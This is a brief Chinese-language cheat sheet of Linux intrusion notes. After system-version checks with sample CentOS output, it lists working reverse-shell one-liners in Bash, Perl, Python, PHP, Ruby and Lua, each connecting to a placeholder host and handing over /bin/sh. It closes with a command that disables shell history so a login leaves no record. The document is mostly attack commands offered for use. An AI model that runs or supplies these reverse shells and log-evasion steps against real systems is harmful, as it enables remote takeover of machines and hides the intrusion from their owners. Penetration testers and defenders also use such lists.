# GUN Linux 提权笔记

### 查看系统版本
``` sh
$ uname -a
$ cat /etc/issue
\S
Kernel \r on an \m

$ cat /etc/*-release

CentOS Linux release 7.4.1708 (Core) 
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"

CentOS Linux release 7.4.1708 (Core) 
CentOS Linux release 7.4.1708 (Core) 

$ cat /proc/version
Linux version 3.10.0-693.11.1.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-16) (GCC) ) #1 SMP Mon Dec 4 23:52:40 UTC 2017

```

### Shell反弹
* **Bash反弹**
``` sh
$ bash -i >& /dev/tcp/1.2.3.4/1234 0>&1
```
* **Perl反弹**
``` sh
$ perl -e 'use Socket;$i="1.2.3.4";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

* **Python反弹**
``` sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* **PHP反弹**
``` sh
$ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
* **Ruby反弹**
``` sh
$ ruby -rsocket -e'f=TCPSocket.open("1.2.3.4",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

* **Lua反弹**
``` sh
$ lua -e "require('socket');require('os');t=socket.tcp();t:connect('1.2.3.4','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 登录SSH后不记录History
``` sh
$ unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
```
